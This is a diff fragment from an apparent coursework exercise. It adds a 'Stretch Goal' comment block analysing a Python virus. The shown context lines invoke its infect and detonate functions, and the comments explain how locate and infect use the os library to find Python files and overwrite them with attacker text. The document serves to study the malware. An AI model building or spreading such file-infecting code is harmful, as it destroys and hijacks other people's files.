@@ -80,3 +80,10 @@ files_targeted = locate(os.path.abspath(""))
 infect(files_targeted)
 # to invoke function detonate to print out to the user that they been hacked if the today's date is May 5th.
 detonate()
+
+
+## Stretch Goal
+# The functions above are utilizing the os library to do the operation. For locate function, it is using listdir, and isdir in the os library. This is a function in os that outputs boolean if there is such director is available. It also utilize listdir which will print out list of files/folder in the given path. Other functions that was used in that function are array builtin function such adding item to the list or extending the list. 
+    # infected also uses os library as well. First it ulitize path.abspath which give absolute path of given file in the parameter. Another builtin python function it utilizes was open operation. `Open` is used to open the file and using that to read or write the file. 
+# This is malware that overrides the python file with string of texts. With given text that attacker feeds and original content in the the python file, it overrides the file and put all of them in same categories.
+# I think this is a well written code in that it does what attacker intended to do. However, some of the functions fulfills multiple things which can be refactored. A function should do one job and do great at it, where infect and locate function seems to be overloaded with multiple functionality.
